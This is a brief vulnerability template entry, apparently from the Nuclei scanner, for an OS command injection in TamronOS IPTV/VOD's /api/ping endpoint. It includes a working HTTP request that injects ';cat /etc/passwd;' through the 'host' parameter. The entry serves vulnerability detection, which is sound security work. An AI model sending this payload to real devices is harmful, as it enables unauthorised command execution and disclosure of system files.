# Nuclei Template: TamronOS IPTV/VOD - Remote Command Execution
**Template ID:** tamronos-rce
**Vulnerability Class:** OS Command Injection
**Severity:** Critical
**CWE:** CWE-78
**Source:** Nuclei Template (`tamronos-rce.yaml`)

## Vulnerability Information & PoC

## Description
TamronOS IPTV/VOD contains a remote command execution in the 'host' parameter of the /api/ping endpoint.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp
```

## References
- https://twitter.com/sec715/status/1405336456923471874
